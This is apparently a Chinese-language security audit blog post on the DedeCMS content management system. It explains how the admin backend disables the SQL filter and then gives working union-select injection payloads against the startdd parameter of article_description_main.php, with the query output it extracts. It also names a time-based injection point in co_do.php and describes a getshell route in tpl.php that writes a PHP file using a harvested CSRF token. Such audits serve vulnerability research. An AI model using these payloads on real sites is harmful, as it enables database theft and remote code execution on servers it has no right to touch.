## cms组成

在`include/common.inc.php`中有一个重要的功能是检查和注册外部提交的变量

但是`preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)`没有对`$_SERVER`和`$_FILE`进行检测

```php
function _RunMagicQuotes(&$svar)
{
    if (!get_magic_quotes_gpc()) {
        if (is_array($svar)) {
            foreach ($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);
        } else {
            if (strlen($svar) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $svar)) {
                exit('Request var not allow!');
            }
            $svar = addslashes($svar);
        }
    }
    return $svar;
}

if (!defined('DEDEREQUEST')) {
    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
    function CheckRequest(&$val)
    {
        if (is_array($val)) {
            foreach ($val as $_k => $_v) {
                if ($_k == 'nvarname') continue;
                CheckRequest($_k);
                CheckRequest($val[$_k]);
            }
        } else {
            if (strlen($val) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)) {
                exit('Request var not allow!');
            }
        }
    }

    //var_dump($_REQUEST);exit;
    CheckRequest($_REQUEST);
    CheckRequest($_COOKIE);

    foreach (array('_GET', '_POST', '_COOKIE') as $_request) {
        foreach ($$_request as $_k => $_v) {
            if ($_k == 'nvarname') ${$_k} = $_v;
            else ${$_k} = _RunMagicQuotes($_v);
        }
    }
}
```

同时dedecms在`include/dedesql.class.php`会对所有sql语句进行检查,检查函数如下

在`ExecuteNoneQuery`和`Execute`均进行了`CheckSql`检查,但是在`dede/config.php`将`$dsql->safeCheck`设置为`FALSE`

因此`CheckSql`仅作用于前台操作,后台操作不进行`CheckSql`,因此可能会产生后台sql注入

```php
function CheckSql($db_string, $querytype = 'select')
{
    global $cfg_cookie_encode;
    $clean = '';
    $error = '';
    $old_pos = 0;
    $pos = -1;
    $log_file = DEDEINC . '/../data/' . md5($cfg_cookie_encode) . '_safe.txt';
    $userIP = GetIP();
    $getUrl = GetCurUrl();

    //如果是普通查询语句，直接过滤一些特殊语法
    if ($querytype == 'select') {
        $notallow1 = "[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,}";

        //$notallow2 = "--|/\*";
        if (preg_match("/" . $notallow1 . "/i", $db_string)) {
            fputs(fopen($log_file, 'a+'), "$userIP||$getUrl||$db_string||SelectBreak\r\n");
            exit("<font size='5' color='red'>Safe Alert: Request Error step 1 !</font>");
        }
    }

    //完整的SQL检查
    while (TRUE) {
        $pos = strpos($db_string, '\'', $pos + 1);
        if ($pos === FALSE) {
            break;
        }
        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
        while (TRUE) {
            $pos1 = strpos($db_string, '\'', $pos + 1);
            $pos2 = strpos($db_string, '\\', $pos + 1);
            if ($pos1 === FALSE) {
                break;
            } elseif ($pos2 == FALSE || $pos2 > $pos1) {
                $pos = $pos1;
                break;
            }
            $pos = $pos2 + 1;
        }
        $clean .= '$s$';
        $old_pos = $pos + 1;
    }
    $clean .= substr($db_string, $old_pos);
    $clean = trim(strtolower(preg_replace(array('~\s+~s'), array(' '), $clean)));

    if (
        strpos($clean, '@') !== FALSE  or strpos($clean, 'char(') !== FALSE or strpos($clean, '"') !== FALSE
        or strpos($clean, '$s$$s$') !== FALSE
    ) {
        $fail = TRUE;
        if (preg_match("#^create table#i", $clean)) $fail = FALSE;
        $error = "unusual character";
    }

    //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它
    if (strpos($clean, 'union') !== FALSE && preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "union detect";
    }

    //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们
    elseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE) {
        $fail = TRUE;
        $error = "comment detect";
    }

    //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库
    elseif (strpos($clean, 'sleep') !== FALSE && preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "slown down detect";
    } elseif (strpos($clean, 'benchmark') !== FALSE && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "slown down detect";
    } elseif (strpos($clean, 'load_file') !== FALSE && preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "file fun detect";
    } elseif (strpos($clean, 'into outfile') !== FALSE && preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s', $clean) != 0) {
        $fail = TRUE;
        $error = "file fun detect";
    }

    //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息
    elseif (preg_match('~\([^)]*?select~s', $clean) != 0) {
        $fail = TRUE;
        $error = "sub select detect";
    }
    if (!empty($fail)) {
        fputs(fopen($log_file, 'a+'), "$userIP||$getUrl||$db_string||$error\r\n");
        exit("<font size='5' color='red'>Safe Alert: Request Error step 2!</font>");
    } else {
        return $db_string;
    }
}
```

但要注意在`Execute`中有一个奇怪的判定

```php
if(!empty($this->result[$id]) && $this->result[$id]===FALSE)
{
    $this->DisplayError(mysql_error()." <br />Error sql: <font color='red'>".$this->queryString."</font>");
}
```

当`$this->result[$id]`为`FALSE`时,`empty($this->result[$id])`为`TRUE`,因此这个条件为永假,无法将报错回显...

[https://3v4l.org/ZaaHl](https://3v4l.org/ZaaHl)

```php
<?php

$result=array('a'=>FALSE);
$id='a';

var_dump($result);

var_dump(!empty($result[$id]) && $result[$id]===FALSE);
```

```
array(1) {
  ["a"]=>
  bool(false)
}
bool(false)
```

## dedecms存在后台sql注入

前面提到`dede/config.php`将`$dsql->safeCheck`设置为`FALSE`,因此在`dede`目录下对`.php`文件进行检索,检索内容为`$dsql->execute`,对返回的每一个文件进行审计

但要注意虽然没有进行`CheckSql`操作,但是在注册变量时仍然对变量进行了`addslashes`操作,因此目标应该主要放在没有使用单引号闭合的语句中

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091519010.png)

### article_description_main.php

```php
if(empty($startdd)) $startdd = 0;
if(empty($pagesize)) $pagesize = 100;
if(empty($totalnum)) $totalnum = 0;
if(empty($sid)) $sid = 0;
if(empty($eid)) $eid = 0;
if(empty($dojob)) $dojob = 'des';

$table = preg_replace("#[^0-9a-zA-Z_\#@]#", "", $table);
$field = preg_replace("#[^0-9a-zA-Z_\[\]]#", "", $field);
$channel = intval($channel);
if($dsize>250) $dsize = 250;
$tjnum = 0;

...

$fquery = "SELECT #@__archives.id,#@__archives.title,#@__archives.description,{$table}.{$field}
              FROM #@__archives LEFT JOIN {$table} ON {$table}.aid=#@__archives.id
              WHERE #@__archives.channel='{$channel}' $addquery LIMIT $startdd,$pagesize ; ";
$dsql->SetQuery($fquery);
$dsql->Execute();
while($row=$dsql->GetArray())
{
    $body = $row[$field];
    $description = $row['description'];
    if(strlen($description)>10 || $description=='-')
    {
        continue;
    }
    $bodytext = preg_replace("/#p#|#e#|副标题|分页标题/isU","",Html2Text($body));
    if(strlen($bodytext) < $msize)
    {
        continue;
    }
    $des = trim(addslashes(cn_substr($bodytext,$dsize)));
    if(strlen($des)<3)
    {
        $des = "-";
    }
    $dsql->ExecuteNoneQuery("UPDATE #@__archives SET description='{$des}' WHERE id='{$row['id']}';");
}
```

`$startdd`没有使用单引号进行闭合就拼接到语句中,由此造成了sql注入,利用前提是网站中要存在一篇文章

前面提到,这个`Execute`的报错判断为永假,因此无法进行报错注入,而这个联合查询是没有直接回显的,因此可以利用后面的`update`语句对文章的`description`的更新将数据回显出来,这里的`description`来源于`$body = $row[$field];`,因此要注意回显参数的位置

注意到`$fquery`中存在`{$table}.aid`,因此`$table`要存在`aid`列

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091626520.png)

结合上面的信息可以构造注入参数如下

```
dojob=des&totalnum=10&dsize=250&table=dede_addonarticle&field=aid&  startdd=0,1 union select 1,2,3,database()#
```

拼接得到的联合查询语句为

```
SELECT dede_archives.id,dede_archives.title,dede_archives.description,dede_addonarticle.aid              FROM dede_archives LEFT JOIN dede_addonarticle ON dede_addonarticle.aid=dede_archives.id              WHERE dede_archives.channel='0'  LIMIT 0,1 union select 1,2,3,database()#,100 ;
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091925187.png)

最终得到的`update`语句为

```
UPDATE dede_archives SET description='dedecms' WHERE id='1';
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091928779.png)

```
dojob=des&totalnum=10&dsize=250&table=dede_addonarticle&field=aid&  startdd=0,1 union select 1,2,3,group_concat(user(),version())#
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203091931186.png)

同一文件中的`$dojob=='page'`貌似也存在注入,但是时间所限,没有去测试

### co_do.php

```php
else if($dopost=="clearct")
{
    CheckPurview('co_Del');
    if(!empty($ids))
    {
        $dsql->ExecuteNoneQuery("UPDATE `#@__co_htmls` SET isdown=0,result='' WHERE aid IN($ids) ");
    }
    ShowMsg("成功清除所有内容!",$ENV_GOBACK_URL);
    exit();
}
```

但是这里没有回显点,使用延迟注入,除了上述的两个注入点外,应该还有其他注入点,但是时间所限,没有去测试

## dede/tpl.php后台getshell

```php
else if ($action == 'upload')
{
    require_once(dirname(__FILE__).'/../include/oxwindow.class.php');
    $acdir = str_replace('.', '', $acdir);
    $win = new OxWindow();
    make_hash();
    $win->Init("tpl.php","js/blank.js","POST' enctype='multipart/form-data' ");
    $win->mainTitle = "模块管理";
    $wecome_info = "<a href='templets_main.php'>模板管理</a> &gt;&gt; 上传模板";
    $win->AddTitle('请选择要上传的文件:');
    $win->AddHidden("action",'uploadok');
    $msg = "
    <table width='600' border='0' cellspacing='0' cellpadding='0'>
  <tr>
    <td width='96' height='60'>请选择文件：</td>
    <td width='504'>
        <input name='acdir' type='hidden' value='$acdir'  />
        <input name='token' type='hidden' value='{$_SESSION['token']}'  />
        <input name='upfile' type='file' id='upfile' style='width:380px' />
      </td>
  </tr>
 </table>
    ";
    $win->AddMsgItem("<div style='padding-left:20px;line-height:150%'>$msg</div>");
    $winform = $win->GetWindow('ok','');
    $win->Display();
    exit();
}

...

else if($action=='savetagfile')
{
    csrf_check();
    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
    {
        ShowMsg('文件名不合法，不允许进行操作！', '-1');
        exit();
    }
    require_once(DEDEINC.'/oxwindow.class.php');
    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
    $content = stripslashes($content);
    $truefile = DEDEINC.'/taglib/'.$filename;
    $fp = fopen($truefile, 'w');
    fwrite($fp, $content);
    fclose($fp);
    $msg = "
    <form name='form1' action='tag_test_action.php' target='blank' method='post'>
      <input type='hidden' name='dopost' value='make' />
        <b>测试标签：</b>(需要使用环境变量的不能在此测试)<br/>
        <textarea name='partcode' cols='150' rows='6' style='width:90%;'>{dede:{$tagname} }{/dede:{$tagname}}</textarea><br />
        <input name='imageField1' type='image' class='np' src='images/button_ok.gif' width='60' height='22' border='0' />
    </form>
    ";
    $wintitle = "成功修改/创建文件！";
    $wecome_info = "<a href='templets_tagsource.php'>标签源码碎片管理</a> &gt;&gt; 修改/新建标签";
    $win = new OxWindow();
    $win->AddTitle("修改/新建标签：");
    $win->AddMsgItem($msg);
    $winform = $win->GetWindow("hand","&nbsp;",false);
    $win->Display();
    exit();
}
```

满足条件`$action=='savetagfile'`和`$filename=xxx.lib.php`即可,但要注意`csrf_check()`会对`token`进行检查

在前面可以看到`<input name='token' type='hidden' value='{$_SESSION['token']}'  />`被写到html中,利用这个token通过csrf检查

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203092111850.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203092114735.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203092114970.png)

